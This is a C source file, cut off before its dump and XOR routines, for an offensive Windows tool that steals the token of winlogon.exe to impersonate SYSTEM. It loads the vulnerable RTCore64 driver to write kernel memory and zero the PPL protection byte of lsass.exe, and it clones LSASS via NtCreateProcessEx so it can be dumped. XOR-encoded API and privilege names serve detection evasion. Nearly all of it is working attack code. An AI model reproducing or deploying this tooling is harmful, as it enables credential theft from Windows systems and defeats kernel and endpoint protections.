/*

    Author: vari.sh

    Description: - This program impersonates SYSTEM and implements LSASS dump. Creates a log.txt file in C:\Windows\Tasks.
                 - Additionally, it uses primitives to access memory via the RTCore64 driver,
                   and reads the EPROCESS structure of lsass.exe to verify the offsets needed for disabling PPL.
                   It then writes the byte that disables PPL.
                 - Finally it clones lsass process and perform minidump of the clone, xoring the result using a temp file in order to bypass detection

*/

#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <stdio.h>
#include <aclapi.h> 
#include <psapi.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>


// Logs
static FILE* logfile;

// =====================================
// API definitions
// =====================================

// XOR key definition
const char* XOR_KEY = "0123456789abcdefghij";
size_t key_len = 20;

// =====================================================
// API Deobfuscation Functions (XOR)
// =====================================================

// Function to decrypt a string (encrypted data is not null-terminated)
char* xor_decrypt_string(const unsigned char* cipher, size_t len, const char* key, size_t key_len)
{
    char* result = (char*)malloc(len + 1);
    if (!result) return NULL;
    for (size_t i = 0; i < len; i++) {
        result[i] = cipher[i] ^ key[i % key_len];
    }
    result[len] = '\0';
    return result;
}

// Function to decrypt a buffer in-place (e.g., for shellcode)
void xor_decrypt_buffer(unsigned char* buffer, size_t len, const char* key, size_t key_len)
{
    for (size_t i = 0; i < len; i++) {
        buffer[i] ^= key[i % key_len];
    }
}

// "Process32FirstW"
static const unsigned char P32F_ENC[] = {
    0x60, 0x43, 0x5D, 0x50, 0x51, 0x46, 0x45, 0x04, 0x0A, 0x7F, 0x08, 0x10, 0x10, 0x10, 0x32
};

// "Process32NextW"
static const unsigned char P32N_ENC[] = {
    0x60, 0x43, 0x5D, 0x50, 0x51, 0x46, 0x45, 0x04, 0x0A, 0x77, 0x04, 0x1A, 0x17, 0x33
};

// "OpenProcess"
static const unsigned char OP_ENC[] = {
    0x7F, 0x41, 0x57, 0x5D, 0x64, 0x47, 0x59, 0x54, 0x5D, 0x4A, 0x12
};

// "GetProcAddress"
static const unsigned char GPA_ENC[] = {
    0x77, 0x54, 0x46, 0x63, 0x46, 0x5A, 0x55, 0x76, 0x5C, 0x5D, 0x13, 0x07, 0x10, 0x17
};

// "NtCreateProcessEx"
static const unsigned char NTCPE_ENC[] = {
    0x7E, 0x45, 0x71, 0x41, 0x51, 0x54, 0x42, 0x52, 0x68, 0x4B, 0x0E, 0x01, 0x06, 0x17, 0x16, 0x23, 0x1F
};

// "CreateToolhelp32Snapshot"
static const unsigned char CTH_ENC[] = {
    0x73, 0x43, 0x57, 0x52, 0x40, 0x50, 0x62, 0x58, 0x57, 0x55, 0x09, 0x07, 0x0F, 0x14, 0x56, 0x54, 0x34, 0x06, 0x08, 0x1A, 0x43, 0x59, 0x5D, 0x47
};

// "OpenProcessToken"
static const unsigned char OPTK_ENC[] = {
    0x7F, 0x41, 0x57, 0x5D, 0x64, 0x47, 0x59, 0x54, 0x5D, 0x4A, 0x12, 0x36, 0x0C, 0x0F, 0x00, 0x08
};

// "DuplicateTokenEx"
static const unsigned char DUPTOK_ENC[] = {
    0x74, 0x44, 0x42, 0x5F, 0x5D, 0x56, 0x57, 0x43, 0x5D, 0x6D, 0x0E, 0x09, 0x06, 0x0A, 0x20, 0x1E
};

// "ImpersonateLoggedOnUser"
static const unsigned char IMP_ENC[] = {
    0x79, 0x5C, 0x42, 0x56, 0x46, 0x46, 0x59, 0x59, 0x59, 0x4D, 0x04, 0x2E, 0x0C, 0x03, 0x02, 0x03, 0x03, 0x27, 0x07, 0x3F, 0x43, 0x54, 0x40
};

// "SetThreadToken"
static const unsigned char STT_ENC[] = {
    0x63, 0x54, 0x46, 0x67, 0x5C, 0x47, 0x53, 0x56, 0x5C, 0x6D, 0x0E, 0x09, 0x06, 0x0A
};

// "AdjustTokenPrivileges"
static const unsigned char ATP_ENC[] = {
    0x71, 0x55, 0x58, 0x46, 0x47, 0x41, 0x62, 0x58, 0x53, 0x5C, 0x0F, 0x32, 0x11, 0x0D, 0x13, 0x0F, 0x0B, 0x0D, 0x0E, 0x0F, 0x43
};

// "LookupPrivilegeValueW"
static const unsigned char LPVA_ENC[] = {
    0x7C, 0x5E, 0x5D, 0x58, 0x41, 0x45, 0x66, 0x45, 0x51, 0x4F, 0x08, 0x0E, 0x06, 0x03, 0x00, 0x30, 0x06, 0x04, 0x1C, 0x0F, 0x67
};

// "MiniDumpWriteDump"
static const unsigned char MDWD_ENC[] = {
    0x7D, 0x58, 0x5C, 0x5A, 0x70, 0x40, 0x5B, 0x47, 0x6F, 0x4B, 0x08, 0x16, 0x06, 0x20, 0x10, 0x0B, 0x17
};


typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef BOOL(WINAPI* PFN_P32F)(
    HANDLE hSnapshot,
    LPPROCESSENTRY32W lppe
    );
typedef BOOL(WINAPI* PFN_P32N)(
    HANDLE hSnapshot,
    LPPROCESSENTRY32W lppe
    );
typedef HANDLE(WINAPI* PFN_OP)(
    DWORD dwDesiredAccess,
    BOOL bInheritHandle,
    DWORD dwProcessId
    );
typedef FARPROC(WINAPI* PFN_GPA)(
    HMODULE hModule,
    LPCSTR lpProcName
    );
typedef NTSTATUS(NTAPI* PFN_NTCPX)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ParentProcess,
    ULONG Flags,
    HANDLE SectionHandle OPTIONAL,
    HANDLE DebugPort OPTIONAL,
    HANDLE ExceptionPort OPTIONAL,
    BOOLEAN InJob
    );
typedef HANDLE(WINAPI* PFN_CTH)(
    DWORD dwFlags,
    DWORD th32ProcessID
    );
typedef BOOL(WINAPI* PFN_OPTK)(
    HANDLE ProcessHandle,
    DWORD DesiredAccess,
    PHANDLE TokenHandle
    );
typedef BOOL(WINAPI* PFN_DUPTOK)(
    HANDLE ExistingTokenHandle,
    DWORD dwDesiredAccess,
    LPSECURITY_ATTRIBUTES lpTokenAttributes,
    SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
    TOKEN_TYPE TokenType,
    PHANDLE DuplicateTokenHandle
    );

typedef BOOL(WINAPI* PFN_IMP)(
    HANDLE hToken
    );

typedef BOOL(WINAPI* PFN_STT)(
    PHANDLE Thread,
    HANDLE Token
    );
typedef BOOL(WINAPI* PFN_ATP)(
    HANDLE TokenHandle,
    BOOL DisableAllPrivileges,
    PTOKEN_PRIVILEGES NewState,
    DWORD BufferLength,
    PTOKEN_PRIVILEGES PreviousState,
    PDWORD ReturnLength
    );
typedef BOOL(WINAPI* PFN_LPVA)(
    LPCWSTR lpSystemName,
    LPCWSTR lpName,
    PLUID   lpLuid
    );
// Define the function pointer type for MiniDumpWriteDump
typedef BOOL(WINAPI* PFN_MDWD)(
    HANDLE hProcess,
    DWORD ProcessId,
    HANDLE hFile,
    MINIDUMP_TYPE DumpType,
    PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam,
    PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
    PMINIDUMP_CALLBACK_INFORMATION CallbackParam
    );

PFN_P32F pP32F = NULL;
PFN_P32N pP32N = NULL;
PFN_OP pOP = NULL;
PFN_GPA pGPA = NULL;
PFN_NTCPX pNTCPX = NULL;
PFN_CTH pCTH = NULL;
PFN_OPTK pOPTK = NULL;
PFN_DUPTOK pDUPTOK = NULL;
PFN_IMP pIMP = NULL;
PFN_STT pSTT = NULL;
PFN_ATP pATP = NULL;
PFN_LPVA pLPVA = NULL;
PFN_MDWD pMDWD = NULL;



// =====================================================
// Memory Access Primitives via RTCore64
// =====================================================

typedef struct _RTCORE64_MSR_READ {
    DWORD Register;
    DWORD ValueHigh;
    DWORD ValueLow;
} RTCORE64_MSR_READ;
#if defined(__STDC_VERSION__) && __STDC_VERSION__ >= 201112L
_Static_assert(sizeof(RTCORE64_MSR_READ) == 12, "sizeof RTCORE64_MSR_READ must be 12 bytes");
#endif

typedef struct _RTCORE64_MEMORY_READ {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
} RTCORE64_MEMORY_READ;
#if defined(__STDC_VERSION__) && __STDC_VERSION__ >= 201112L
_Static_assert(sizeof(RTCORE64_MEMORY_READ) == 48, "sizeof RTCORE64_MEMORY_READ must be 48 bytes");
#endif

typedef struct _RTCORE64_MEMORY_WRITE {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
} RTCORE64_MEMORY_WRITE;
#if defined(__STDC_VERSION__) && __STDC_VERSION__ >= 201112L
_Static_assert(sizeof(RTCORE64_MEMORY_WRITE) == 48, "sizeof RTCORE64_MEMORY_WRITE must be 48 bytes");
#endif

// IOCTL codes for RTCORE64
static const DWORD RTC64_MSR_READ_CODE = 0x80002030;
static const DWORD RTC64_MEMORY_READ_CODE = 0x80002048;
static const DWORD RTC64_MEMORY_WRITE_CODE = 0x8000204c;

DWORD ReadMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address) {
    RTCORE64_MEMORY_READ memRead = { 0 };
    memRead.Address = Address;
    memRead.ReadSize = Size;
    DWORD BytesReturned;
    DeviceIoControl(Device,
        RTC64_MEMORY_READ_CODE,
        &memRead,
        sizeof(memRead),
        &memRead,
        sizeof(memRead),
        &BytesReturned,
        NULL);
    return memRead.Value;
}

void WriteMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address, DWORD Value) {
    RTCORE64_MEMORY_WRITE memWrite = { 0 };
    memWrite.Address = Address;
    memWrite.ReadSize = Size;
    memWrite.Value = Value;
    DWORD BytesReturned;
    DeviceIoControl(Device,
        RTC64_MEMORY_WRITE_CODE,
        &memWrite,
        sizeof(memWrite),
        &memWrite,
        sizeof(memWrite),
        &BytesReturned,
        NULL);
}

WORD ReadMemoryWORD(HANDLE Device, DWORD64 Address) {
    return (WORD)(ReadMemoryPrimitive(Device, 2, Address) & 0xffff);
}

DWORD ReadMemoryDWORD(HANDLE Device, DWORD64 Address) {
    return ReadMemoryPrimitive(Device, 4, Address);
}

DWORD64 ReadMemoryDWORD64(HANDLE Device, DWORD64 Address) {
    return (((DWORD64)ReadMemoryDWORD(Device, Address + 4)) << 32) | ReadMemoryDWORD(Device, Address);
}

void WriteMemoryDWORD64(HANDLE Device, DWORD64 Address, DWORD64 Value) {
    WriteMemoryPrimitive(Device, 4, Address, (DWORD)(Value & 0xffffffff));
    WriteMemoryPrimitive(Device, 4, Address + 4, (DWORD)(Value >> 32));
}

// Helper function to read a memory buffer in 4-byte chunks
BOOL ReadMemoryBuffer(HANDLE Device, DWORD64 Address, void* Buffer, DWORD BufferSize) {
    DWORD numDwords = BufferSize / 4;
    DWORD remainder = BufferSize % 4;
    for (DWORD i = 0; i < numDwords; i++) {
        ((DWORD*)Buffer)[i] = ReadMemoryDWORD(Device, Address + i * 4);
    }
    if (remainder) {
        DWORD value = ReadMemoryPrimitive(Device, remainder, Address + numDwords * 4);
        memcpy((BYTE*)Buffer + numDwords * 4, &value, remainder);
    }
    return TRUE;
}

// =====================================================
// Retrieve the Base Address of ntoskrnl.exe via EnumDeviceDrivers
// =====================================================
unsigned long long getKBAddr() {
    DWORD cbNeeded = 0;
    PVOID* base = NULL;
    if (EnumDeviceDrivers(NULL, 0, &cbNeeded)) {
        base = (PVOID*)malloc(cbNeeded);
        if (base) {
            if (EnumDeviceDrivers(base, cbNeeded, &cbNeeded)) {
                unsigned long long addr = (unsigned long long)base[0];
                free(base);
                return addr;
            }
            free(base);
        }
    }
    return 0;
}

// =====================================================
// OS Version Detection and Offsets setting
// =====================================================

// Structure containing the three useful offsets
typedef struct _Offsets {
    DWORD64 ActiveProcessLinks;  // Offset of the ActiveProcessLinks field in _EPROCESS
    DWORD64 ImageFileName;       // Offset of the ImageFileName field in _EPROCESS
    DWORD64 Protection;          // Offset of the Protection (PS_PROTECTION) field in _EPROCESS
} Offsets;


// Function to get the OS version
int GetOSVersion() {
    wchar_t CurrentBuild[255] = { 0 };
    DWORD bufferSize = sizeof(CurrentBuild);
    LONG ret = RegGetValueW(
        HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
        L"CurrentBuild",
        RRF_RT_REG_SZ,
        NULL,
        CurrentBuild,
        &bufferSize
    );
    if (ret == ERROR_SUCCESS) {
        fwprintf(logfile, L"[*] Windows Build %s detected\n", CurrentBuild);
        return _wtoi(CurrentBuild);
    }
    else {
        fwprintf(logfile, L"[ERROR] Unable to retrieve Windows Build. Error code: %ld\n", ret);
        return -1;
    }
}

// Function to get the offsets
Offsets getOffsets() {
    int build = GetOSVersion();

    if (build < 0) {
        exit(-1);
    }

    Offsets offs = { 0, 0, 0 };

    // Offsets table for x64 (TODO)
    if (build <= 16384) {       // Windows 8 Server 2012 NO PPL FIELD
        offs.ActiveProcessLinks = 0x0000;
        offs.ImageFileName = 0x0000;
        offs.Protection = 0x0000;
    }
    else if (build <= 17415) {       // Windows 8.1 Server 2012R2 and RTM (16384)
        offs.ActiveProcessLinks = 0x2e8;
        offs.ImageFileName = 0x438;
        offs.Protection = 0x67a;
    }
    else if (build <= 19045) {       // Windows 10 version 22H2 (Build 19041)
        offs.ActiveProcessLinks = 0x448;
        offs.ImageFileName = 0x5a8;
        offs.Protection = 0x87a;
    }
    else if (build <= 22631) {  // Windows 23H2
        offs.ActiveProcessLinks = 0x448;
        offs.ImageFileName = 0x5a8;
        offs.Protection = 0x87a;
    }
    else if (build > 22631) {  // Windows 11 24H2 and above
        offs.ActiveProcessLinks = 0x1d8;
        offs.ImageFileName = 0x338;
        offs.Protection = 0x5fa;
    }
    else {
        fwprintf(logfile, L"[ERROR] Offsets not defined for build %d on x64.\n", build);
        exit(1);
    }
    return offs;
}

// =====================================================
// Driver loading and unloading
// =====================================================

// Function to load and start the driver
#define DRIVER_NAME "mDriver"
#define DRIVER_PATH "C:\\Windows\\Tasks\\RTCore64.sys"
#define DEVICE_NAME L"\\\\.\\RTCore64"

// Helper function to open the Service Control Manager with the specified access rights
SC_HANDLE OpenSCManagerHandle(DWORD dwAccess) {
    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, dwAccess);
    if (!hSCM) {
        fprintf(logfile, "[ERROR] OpenSCManager failed. Error code: %lu\n", GetLastError());
    }
    return hSCM;
}

// Helper function to create or open the driver service
SC_HANDLE CreateOrOpenDriverService(SC_HANDLE hSCM, const char* driverName, const char* driverPath) {
    SC_HANDLE hService = CreateServiceA(
        hSCM,
        driverName,          // Internal service name
        driverName,          // Display name
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        driverPath,          // Full path to the driver file
        NULL, NULL, NULL, NULL, NULL
    );
    if (!hService) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_EXISTS) {
            hService = OpenServiceA(hSCM, driverName, SERVICE_ALL_ACCESS);
            if (hService) {
                fprintf(logfile, "[+] Existing service opened successfully.\n");
            }
            else {
                fprintf(logfile, "[ERROR] Unable to open the existing service. Error code: %lu\n", GetLastError());
            }
        }
        else if (err == ERROR_SERVICE_MARKED_FOR_DELETE) {
            fprintf(logfile, "[ERROR] Service is marked for deletion.\n");
        }
        else {
            fprintf(logfile, "[ERROR] CreateService error. Error code: %lu\n", err);
        }
    }
    else {
        fprintf(logfile, "[+] Service created successfully.\n");
    }
    return hService;
}

// Function to load and start the driver
int LoadAndStartDriver(void) {
    SC_HANDLE hSCM = OpenSCManagerHandle(SC_MANAGER_CREATE_SERVICE);
    if (!hSCM)
        return 1;

    SC_HANDLE hService = CreateOrOpenDriverService(hSCM, DRIVER_NAME, DRIVER_PATH);
    if (!hService) {
        CloseServiceHandle(hSCM);
        return 1;
    }

    // Start the driver service
    if (!StartServiceA(hService, 0, NULL)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            fprintf(logfile, "[ERROR] StartService error. Error code: %lu\n", err);
            DeleteService(hService);
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return 1;
        }
        else {
            fprintf(logfile, "[*] Driver is already loaded.\n");
        }
    }
    else {
        fprintf(logfile, "[+] Driver loaded and started successfully.\n");
    }

    // Close the handles
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return 0;
}

// Function to stop and unload the driver
int StopAndUnloadDriver(const char* driverName) {
    SC_HANDLE hSCM = OpenSCManagerHandle(SC_MANAGER_ALL_ACCESS);
    if (!hSCM)
        return 1;

    SC_HANDLE hService = OpenServiceA(hSCM, driverName, SERVICE_STOP | DELETE | SERVICE_QUERY_STATUS);
    if (!hService) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_DOES_NOT_EXIST) {
            fprintf(logfile, "[ERROR] Service does not exist.\n");
            CloseServiceHandle(hSCM);
            return 0;
        }
        else if (err == ERROR_SERVICE_MARKED_FOR_DELETE) {
            fprintf(logfile, "[*] Service is already marked for deletion.\n");
            CloseServiceHandle(hSCM);
            return 0;
        }
        else {
            fprintf(logfile, "[ERROR] Error: %s.\n", err);
            CloseServiceHandle(hSCM);
            return 0;
        }
        fprintf(logfile, "[ERROR] OpenService failed. Error code: %lu\n", err);
        CloseServiceHandle(hSCM);
        return 1;

    }

    SERVICE_STATUS status;
    if (!ControlService(hService, SERVICE_CONTROL_STOP, &status)) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_NOT_ACTIVE) {
            fprintf(logfile, "[*] The service is not active.\n");
        }
        else {
            fprintf(logfile, "[ERROR] ControlService (stop) failed. Error code: %lu\n", err);
        }
    }
    else {
        fprintf(logfile, "[+] Service stopped successfully.\n");
    }

    // Attempt to delete the service
    if (!DeleteService(hService)) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_MARKED_FOR_DELETE) {
            fprintf(logfile, "[*] Service is already marked for deletion.\n");
        }
        else {
            fprintf(logfile, "[ERROR] DeleteService failed. Error code: %lu\n", err);
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return 1;
        }
    }
    else {
        fprintf(logfile, "[+] Service deleted successfully.\n");
    }

    // Close the handles
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return 0;
}

// =====================================================
// Function to Read the EPROCESS Structure of lsass.exe
// =====================================================

void static disablePPL() {

    Offsets offs = getOffsets();
    if (offs.ActiveProcessLinks == 0 || offs.ImageFileName == 0 || offs.Protection == 0) {
        fprintf(logfile, "[ERROR] Offset not mapped... exiting!\n");
        exit(1);
    }

    HANDLE Device = CreateFileW(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (Device == INVALID_HANDLE_VALUE) {
        fprintf(logfile, "[ERROR] Unable to obtain a handle to the device object\n");
        return;
    }
    fprintf(logfile, "[*] Device handle obtained\n");

    unsigned long long ntoskrnlBase = getKBAddr();
    fprintf(logfile, "[*] ntoskrnl.exe base address: 0x%llx\n", ntoskrnlBase);

    HMODULE hNtoskrnl = LoadLibraryW(L"ntoskrnl.exe");
    if (!hNtoskrnl) {
        fprintf(logfile, "[ERROR] Failed to load ntoskrnl.exe\n");
        CloseHandle(Device);
        return;
    }
    // Calculate the offset of the exported variable PsInitialSystemProcess
    DWORD64 PsInitialSystemProcessOffset = (DWORD64)GetProcAddress(hNtoskrnl, "PsInitialSystemProcess") - (DWORD64)hNtoskrnl;
    FreeLibrary(hNtoskrnl);

    // Retrieve the address of the System process's EPROCESS
    DWORD64 SystemProcessEPROCESS = ReadMemoryDWORD64(Device, ntoskrnlBase + PsInitialSystemProcessOffset);
    fprintf(logfile, "[*] PsInitialSystemProcess (EPROCESS) address: 0x%llx\n", SystemProcessEPROCESS);

    // Calculate the list head (located within the EPROCESS)
    DWORD64 ListHead = SystemProcessEPROCESS + offs.ActiveProcessLinks;
    DWORD64 CurrentEntry = ReadMemoryDWORD64(Device, ListHead); // First element of the list

    while (CurrentEntry != ListHead) {
        // The current EPROCESS address is obtained by subtracting the offset from the LIST_ENTRY pointer
        DWORD64 eprocess = CurrentEntry - offs.ActiveProcessLinks;

        // Read the ImageFileName field (15 bytes, as defined in the struct) and add a null terminator
        char imageName[16] = { 0 };
        ReadMemoryBuffer(Device, eprocess + offs.ImageFileName, imageName, 15);
        imageName[15] = '\0';

        if (_stricmp(imageName, "lsass.exe") == 0) {
            fprintf(logfile, "[*] Found EPROCESS at 0x%llx\n", eprocess);
            // Read the protection byte (PPL) from the EPROCESS
            BYTE protection = (BYTE)ReadMemoryPrimitive(Device, 1, eprocess + offs.Protection);
            fprintf(logfile, "[*] Protection value: 0x%02X\n", protection);

            // To disable PPL, write 0x00 into this field.
            // Warning: perform this operation only if you are sure the offsets are correct.
            WriteMemoryPrimitive(Device, 1, eprocess + offs.Protection, 0x00);
            fprintf(logfile, "[+] PPL disabled (0x00 written)\n");

            // Read the protection byte (PPL) from the EPROCESS again
            BYTE protection_post = (BYTE)ReadMemoryPrimitive(Device, 1, eprocess + offs.Protection);
            fprintf(logfile, "[*] Protection value after write: 0x%02X\n", protection_post);

            break;
        }
        // Move to the next element in the list
        CurrentEntry = ReadMemoryDWORD64(Device, CurrentEntry);
    }

    CloseHandle(Device);
}

// =====================================================
// Function to load clean versions of DLLs
// =====================================================
HMODULE LoadCleanDLL(char* dllPath) {

    HMODULE hDLL = LoadLibraryA(dllPath);
    if (hDLL)
    {
        fprintf(logfile, "[+] Loaded clean copy of %s at: %p\n", dllPath, hDLL);
    }
    else
    {
        fprintf(logfile, "[ERROR] Failed to load %s. Error: %lu\n", dllPath, GetLastError());
    }

    return hDLL;
}

// =====================================================
// Function to obtain a SYSTEM token
// =====================================================
BOOL GetSystemTokenAndDuplicate(HANDLE* hSystemToken) {
    PROCESSENTRY32W pe = { 0 };
    pe.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = pCTH(TH32CS_SNAPPROCESS, 0);
    fprintf(logfile, "[*] Snapshot handle: %p\n", hSnapshot);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        fprintf(logfile, "pCTH  error: %u\n", GetLastError());
        return FALSE;
    }

    BOOL found = FALSE;
    HANDLE hProcess = NULL;
    HANDLE hToken = NULL;
    HANDLE hDupToken = NULL;

    if (pP32F(hSnapshot, &pe)) {
        do {
            // Look for winlogon
            if (_wcsicmp(pe.szExeFile, L"winlogon.exe") == 0) {
                hProcess = pOP(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
                if (hProcess) {
                    if (pOPTK(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
                        if (pDUPTOK(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hDupToken)) {
                            *hSystemToken = hDupToken;
                            found = TRUE;
                            CloseHandle(hToken);
                            CloseHandle(hProcess);
                            fprintf(logfile, "[+] Successfully duplicated token. Process can now run as SYSTEM.\n");
                            break;
                        }
                        CloseHandle(hToken);
                    }
                    CloseHandle(hProcess);
                }
            }
        } while (pP32N(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);

    if (!found) {
        fprintf(logfile, "Failed to obtain system token\n");
        return FALSE;
    }
    return TRUE;
}


// ========================================
// Functions to get all privileges
// ========================================

// SeDebugPrivilege
static const unsigned char SE_DEBUG_ENC[] = { 0x63, 0x74, 0x6D, 0x77, 0x71, 0x77, 0x63, 0x70, 0x67, 0x77, 0x20, 0x2F, 0x26 };
// SeImpersonatePrivilege
static const unsigned char SE_IMP_ENC[] = { 0x63, 0x74, 0x6D, 0x7A, 0x79, 0x65, 0x73, 0x65, 0x6B, 0x76, 0x2F, 0x23, 0x37, 0x21, 0x3A, 0x28, 0x26, 0x25, 0x2C };

static const unsigned char* privs[] = {
    SE_DEBUG_ENC,
    SE_IMP_ENC
};
static const size_t priv_lens[] = {
    sizeof(SE_DEBUG_ENC),
    sizeof(SE_IMP_ENC)
};

// Function to enable a specific privilege on the provided token.
// This function does not open the token itself, but uses the token passed as parameter.
BOOL EnablePrivilege(HANDLE hToken, const unsigned char* encryptedPriv, size_t encLen) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    // Decrypt string
    char* dec = xor_decrypt_string(encryptedPriv, encLen, XOR_KEY, key_len);

    if (!pLPVA(NULL, dec, &luid)) {
        free(dec);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;

    DWORD attr = 0xA5 ^ 0xA7; // SE_PRIVILEGE_ENABLED (0x02) obfuscated
    tp.Privileges[0].Attributes = attr;

    BOOL result = pATP(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);

    free(dec);

    if (!result || GetLastError() == ERROR_NOT_ALL_ASSIGNED)
        return FALSE;

    return TRUE;
}

void EnableAllPrivileges(HANDLE hToken) {
    int n = sizeof(privs) / sizeof(privs[0]);
    for (int i = 0; i < n; i++) {
        if (!EnablePrivilege(hToken, privs[i], priv_lens[i])) {
            // fprintf(logfile, "[!] Failed to enable priv #%d\n", i);
        }
        else {
            // fprintf(logfile, "[+] Privilege #%d enabled\n", i);
        }
    }
}

// =====================================================
// get_proc_address reimplementation
// =====================================================

FARPROC CustomGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
    if (!hModule || !lpProcName) return NULL;

    BYTE* baseAddr = (BYTE*)hModule;
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)baseAddr;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(baseAddr + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return NULL;

    IMAGE_DATA_DIRECTORY exportDirData = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!exportDirData.VirtualAddress) return NULL;

    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)(baseAddr + exportDirData.VirtualAddress);

    DWORD* names = (DWORD*)(baseAddr + exportDir->AddressOfNames);
    WORD* ordinals = (WORD*)(baseAddr + exportDir->AddressOfNameOrdinals);
    DWORD* functions = (DWORD*)(baseAddr + exportDir->AddressOfFunctions);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        char* name = (char*)(baseAddr + names[i]);
        if (_stricmp(name, lpProcName) == 0) {
            WORD ordinal = ordinals[i];
            DWORD funcRVA = functions[ordinal];
            FARPROC address = (FARPROC)(baseAddr + funcRVA);

            // Check if it's a forward export
            DWORD exportStart = exportDirData.VirtualAddress;
            DWORD exportEnd = exportStart + exportDirData.Size;
            if (funcRVA >= exportStart && funcRVA <= exportEnd) {
                // It's a forward export (e.g., "sechost.OpenProcessToken")
                char* forwardName = (char*)address;
                char dllName[256] = { 0 };
                char funcName[128] = { 0 };

                sscanf(forwardName, "%[^.].%s", dllName, funcName);
                strcat_s(dllName, sizeof(dllName), ".dll");

                HMODULE hFwd = LoadLibraryA(dllName);
                if (!hFwd) return NULL;

                return GetProcAddress(hFwd, funcName);
            }

            return address;
        }
    }

    return NULL;
}

// ==================================
// Cloning LSASS
// ==================================

#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES);        \
    (p)->RootDirectory = r;                         \
    (p)->Attributes = a;                            \
    (p)->ObjectName = n;                            \
    (p)->SecurityDescriptor = s;                    \
    (p)->SecurityQualityOfService = NULL;           \
}

#define PROCESS_CREATE_FLAGS_INHERIT_HANDLES     0x00000004
#define PROCESS_CREATE_FLAGS_NO_SYNCHRONIZE      0x00000008

HANDLE CloneLsassProcess() {
    HANDLE hSnapshot = pCTH(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return NULL;

    PROCESSENTRY32W pe = { 0 };
    pe.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hLsass = NULL;
    if (pP32F(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
                hLsass = pOP(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
                break;
            }
        } while (pP32N(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    fwprintf(logfile, L"[*] Found process: %s (PID: %lu)\n", pe.szExeFile, pe.th32ProcessID);

    if (!hLsass) {
        fprintf(logfile, "[!] Failed to open lsass.exe\n");
        return NULL;
    }

    HMODULE ntdll = LoadCleanDLL("ntdll.dll");
    if (!ntdll) return NULL;


    HANDLE hClone = NULL;

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    NTSTATUS status = pNTCPX(
        &hClone,
        PROCESS_ALL_ACCESS,
        &objAttr,
        hLsass,
        0,
        NULL,
        NULL,
        NULL,
        FALSE
    );

    CloseHandle(hLsass);

    if (status != 0) {
        fprintf(logfile, "[!] pNTCPX failed : 0x % X\n", status);
        return NULL;
    }

    fprintf(logfile, "[+] Successfully cloned LSASS process, handle: 0x%p\n", hClone);
    return hClone;
}

DWORD GetProcessIdFromHandle(HANDLE hProcess) {
    return GetProcessId(hProcess);
}

// Function to XOR the dmp file
// XOR encryption function using a string key
